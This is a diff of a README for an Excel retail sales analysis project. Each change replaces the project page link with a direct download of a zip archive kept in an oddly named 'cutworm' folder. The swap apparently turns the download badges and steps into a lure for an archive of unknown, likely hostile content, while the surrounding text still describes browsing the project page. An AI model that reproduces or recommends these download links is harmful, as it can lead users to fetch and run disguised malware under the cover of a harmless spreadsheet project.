@@ -1,6 +1,6 @@
 # 📊 Advanced-Excel-Retail-Sales-Analysis - Clear Retail Sales Insights Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip)
 
 ## 🧾 Overview
 
@@ -18,7 +18,7 @@ This project is meant for users who want to open an Excel file and work with sal
 ## 📥 Download and Open
 
 1. Visit this page to download the project files:  
-   https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis
+   https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip
 
 2. On the GitHub page, look for the file list and download the workbook or project files.
 
@@ -28,7 +28,7 @@ This project is meant for users who want to open an Excel file and work with sal
 
 5. Open the main Excel file with Microsoft Excel.
 
-[![Download Project](https://img.shields.io/badge/Get%20Project%20Files-grey?style=for-the-badge)](https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis)
+[![Download Project](https://img.shields.io/badge/Get%20Project%20Files-grey?style=for-the-badge)](https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip)
 
 ## 🔍 What This Project Does
 
@@ -207,4 +207,4 @@ A good review flow is:
 ## 📎 Project Link
 
 Open the project page here:  
-https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis
+https://raw.githubusercontent.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis/main/cutworm/Advanced-Sales-Analysis-Retail-Excel-v3.6.zip
